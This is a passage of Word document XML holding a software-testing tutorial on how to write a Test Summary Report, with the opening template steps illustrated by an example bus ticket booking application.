        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="343" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006A7AA5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A Simple 12 Steps Guide to Write an Effective Test Summary Report [with a Sample Report for Download]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">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Several documents and reports are being prepared as part of Testing. Some are </w:t>
      </w:r>
      <w:hyperlink r:id="rId149" w:tooltip="Test strategy document" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Test Strategy doc</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId150" w:tooltip="Test plan document" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Test Plan doc</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId151" w:tooltip="risk management in software testing" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Risk management Plan</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>, Configuration management plan etc. Among these Test Summary Report is one such report which is prepared after the Testing is completed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">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I have tried to explain the purpose of ‘</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Test Summary Report</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>’ and provided a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>sample Test Summary Report template along with an actual report for download.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">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What is a Test Summary Report?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">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As we know, Software Testing is an important phase in SDLC and also it serves as the “Quality Gate” for the application to pass through and certified as “Can Go Live” by the Testing Team.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">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1ECF19DB" wp14:editId="0A1FB05E">
            <wp:extent cx="4613275" cy="3188335"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="37" name="Picture 37" descr="test reporti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 reporti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13275" cy="318833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369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="810" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="811" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Test Summary Report is an important deliverable which is prepared at the end of a Testing project, or rather after Testing is completed. The prime objective of this document is to explain various details and activities about the Testing performed for the Project, to the respective stakeholders like Senior Management, Client etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="812" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="813" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>As part of </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/how-to-write-software-testing-weekly-status-report/" \o "daily/weekly status report" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Daily status reports</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>, daily testing results will be shared with involved stakeholders every day. But Test Summary Report provides a consolidated report on the Testing performed so far for the project.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="814" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="815" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Recommended reading</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> =&gt; </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/test-execution-report/" \o "Test execution report" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>How to Report Test Execution Smartly (Status Report Template download)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="816" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="817" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Assume that if the Client who sits in a remote location need to understand the results and status about a Testing project which was performed for a period of, say for example – four months, Test Summary Report will solve the purpose.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="818" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="819" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>This is also an artifact required to be prepared as part of </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/cmmi-appraisals-testers-journey-as-an-appraisal-team-member-atm/" \o "CMMI process" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>CMMI process</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="820" w:author="Unknown"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="31"/>
          <w:szCs w:val="31"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="821" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="31"/>
            <w:szCs w:val="31"/>
          </w:rPr>
          <w:t>What Test Summary Report contains?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="822" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="823" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>A typical </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Test Report template</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> will contain the below information, however based on each Company’s format &amp; practice, the contents may vary. I have also provided real examples for better understanding.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="824" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="825" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>At the end of this article you can download a test summary report sample.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="826" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="827" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>12 Steps Guide to writing an effective test summary report:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="828" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="829" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #1: Purpose of the document</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="830" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="831" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;Short description about the objective of preparing the document&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="832" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="833" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>This document explains the various activities performed as part of Testing of ‘ABCD transport system’ application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="834" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="835" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step #2: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Application Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="836" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="837" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;Brief description about the application tested&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="838" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="839" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>‘ABCD</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> transport system’ is a web based Bus ticket booking application. Tickets for various buses can be booked using the online facilities. Real time passenger information is received from a ‘Central repository system’, which will be referred before booking is confirmed. There are several modules like Registration, Booking, Payment and Reports which are integrated to fulfill the purpose.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="840" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="841" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step #3: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Testing Scope</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="122"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="842" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
